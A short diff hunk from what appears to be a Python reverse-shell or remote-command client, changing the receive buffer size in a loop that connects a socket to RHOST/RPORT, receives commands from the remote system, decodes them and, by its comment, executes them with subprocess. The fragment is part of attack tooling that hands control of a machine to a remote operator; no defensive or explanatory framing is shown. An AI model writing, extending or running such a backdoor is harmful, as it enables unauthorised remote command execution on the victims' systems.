@@ -29,7 +29,7 @@ def main():
     s.connect((RHOST,RPORT))
     # Receiving commands from the remote system
     while True:
-        data1=s.recv(1024)
+        data1=s.recv(4096)
         print("Received command is:",data1)
         data=de(data1)
         # Executing the output using the subprocess lib
